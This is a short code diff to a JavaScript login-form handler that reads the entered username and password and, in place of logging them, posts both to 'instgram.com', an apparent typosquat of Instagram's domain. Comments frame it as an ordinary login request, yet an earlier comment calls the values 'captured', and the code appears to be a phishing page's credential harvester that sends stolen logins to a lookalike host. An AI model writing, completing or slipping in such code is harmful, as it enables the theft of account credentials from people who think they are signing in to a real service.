@@ -5,8 +5,28 @@ document.addEventListener("DOMContentLoaded", function() {
     var username = document.getElementById("username").value;
     var password = document.getElementById("password").value;
 
-    // Do something with the captured username and password
-    console.log("Username:", username);
-    console.log("Password:", password);
+    // Send login request to the server
+    fetch('https://instgram.com/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        username: username,
+        password: password
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        // Handle successful login response
+        console.log("Login successful");
+      } else {
+        // Handle login error
+        console.error("Login failed");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+    });
   });
 });
